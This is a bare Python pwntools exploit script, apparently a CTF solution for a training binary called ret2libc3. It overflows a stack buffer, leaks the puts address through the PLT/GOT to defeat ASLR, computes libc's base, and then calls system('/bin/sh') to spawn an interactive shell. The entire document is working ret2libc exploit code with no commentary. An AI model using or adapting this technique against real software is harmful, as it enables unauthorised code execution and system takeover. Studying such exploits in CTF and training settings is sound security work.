from pwn import *
sh = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = elf.libc

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
start_addr = elf.symbols['_start']

payload = flat(["A" * 112, puts_plt, start_addr, puts_got])

sh.sendlineafter("Can you find it !?", payload)
puts_addr = u32(sh.recv(4))

libc.address = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system']
binsh_addr = next(libc.search('/bin/sh'))

payload2 = flat(["B" * 112, system_addr, "CCCC", binsh_addr])
sh.sendline(payload2)
sh.interactive()